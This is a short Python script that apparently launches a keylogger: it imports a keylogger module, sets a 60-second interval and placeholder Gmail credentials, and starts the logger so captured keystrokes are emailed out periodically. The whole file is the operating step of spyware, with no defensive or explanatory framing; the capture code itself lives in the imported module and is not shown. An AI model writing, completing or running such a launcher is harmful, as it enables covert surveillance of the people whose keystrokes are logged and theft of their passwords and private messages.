import keylogger

# Set the time interval, email, and password
time_interval = 60  # Example: Log and send email every 60 seconds
email = "your-adresse@gmail.com"  # Example: Your email address
password = "your-password"  # Example: Your email password

# Create an instance of the Keylogger class
keylogger = keylogger.keylogger(time_interval, email, password)

# Launch the keylogger
keylogger.launchApp()